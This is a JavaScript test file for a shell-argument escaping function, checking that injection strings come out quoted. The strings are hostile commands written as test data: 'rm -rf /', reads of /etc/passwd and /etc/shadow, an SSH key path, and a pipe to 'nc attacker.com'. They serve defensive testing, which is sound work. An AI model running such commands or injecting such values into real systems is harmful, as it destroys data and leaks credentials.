import { describe, it, expect } from 'vitest';
import { escapeShellArg } from '../../src/util/shellEscape.js';

/**
 * Security-focused tests demonstrating protection against shell injection attacks
 */
describe('shellEscape - Security Tests', () => {
    describe('Command Injection Prevention', () => {
        it('should prevent command chaining with semicolon', () => {
            const malicious = 'test; rm -rf /';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'test; rm -rf /'");
            // The semicolon is now inside quotes, so it won't execute the second command
        });

        it('should prevent command chaining with double ampersand', () => {
            const malicious = 'test && cat /etc/passwd';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'test && cat /etc/passwd'");
        });

        it('should prevent command chaining with pipe', () => {
            const malicious = 'test | nc attacker.com 1234';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'test | nc attacker.com 1234'");
        });

        it('should prevent command substitution with $(...)', () => {
            const malicious = '$(whoami)';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'$(whoami)'");
            // The command substitution won't execute
        });

        it('should prevent command substitution with backticks', () => {
            const malicious = '`whoami`';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'`whoami`'");
        });

        it('should prevent variable expansion', () => {
            const malicious = '$HOME/.ssh/id_rsa';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'$HOME/.ssh/id_rsa'");
            // $HOME won't be expanded
        });

        it('should prevent file redirection', () => {
            const malicious = 'test > /tmp/output.txt';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'test > /tmp/output.txt'");
        });

        it('should prevent file reading', () => {
            const malicious = 'test < /etc/passwd';
            const escaped = escapeShellArg(malicious);
            expect(escaped).toBe("'test < /etc/passwd'");
        });
    });

    describe('Real-World Attack Scenarios', () => {
        it('should prevent model name injection', () => {
            // Attacker tries to inject commands via model parameter
            const maliciousModel = "gpt-4'; rm -rf /; echo 'pwned";
            const escaped = escapeShellArg(maliciousModel);
            expect(escaped).toBe("'gpt-4'\\''; rm -rf /; echo '\\''pwned'");
            // The quotes are escaped, preventing command injection
        });

        it('should prevent directory traversal with command injection', () => {
            const maliciousPath = '../../etc/passwd; cat /etc/shadow';
            const escaped = escapeShellArg(maliciousPath);
            expect(escaped).toBe("'../../etc/passwd; cat /etc/shadow'");
        });

        it('should prevent context injection with newlines', () => {
            const maliciousContext = 'test\nrm -rf /\necho done';
            const escaped = escapeShellArg(maliciousContext);
            expect(escaped).toBe("'test\nrm -rf /\necho done'");
            // Newlines are preserved but won't execute as separate commands
        });

        it('should prevent package argument injection', () => {
            const maliciousPackage = "@scope/package'; npm publish --otp=stolen; echo '";
            const escaped = escapeShellArg(maliciousPackage);
            expect(escaped).toBe("'@scope/package'\\''; npm publish --otp=stolen; echo '\\'''");
        });
    });

    describe('Edge Cases', () => {
        it('should handle strings with only special characters', () => {
            expect(escapeShellArg(';;;;')).toBe("';;;;'");
            expect(escapeShellArg('&&&&')).toBe("'&&&&'");
            expect(escapeShellArg('||||')).toBe("'||||'");
        });

        it('should handle mixed quotes and special chars', () => {
            const complex = "it's a \"test\" with $vars && commands";
            const escaped = escapeShellArg(complex);
            expect(escaped).toBe("'it'\\''s a \"test\" with $vars && commands'");
        });

        it('should handle unicode characters safely', () => {
            const unicode = '测试 🚀 тест';
            const escaped = escapeShellArg(unicode);
            expect(escaped).toBe("'测试 🚀 тест'");
        });
    });

    describe('Demonstration of Before/After', () => {
        it('demonstrates the vulnerability before fix', () => {
            // BEFORE (vulnerable approach):
            const userInput = 'test"; rm -rf /; echo "pwned';
            const vulnerableCommand = `--model "${userInput}"`;
            // This would result in: --model "test"; rm -rf /; echo "pwned"
            // The quotes don't protect against injection!
            expect(vulnerableCommand).toBe('--model "test"; rm -rf /; echo "pwned"');
        });

        it('demonstrates the fix', () => {
            // AFTER (secure approach):
            const userInput = 'test"; rm -rf /; echo "pwned';
            const secureCommand = `--model ${escapeShellArg(userInput)}`;
            // This results in: --model 'test"; rm -rf /; echo "pwned'
            // The entire string is treated as a single literal argument
            expect(secureCommand).toBe("--model 'test\"; rm -rf /; echo \"pwned'");
        });
    });
});
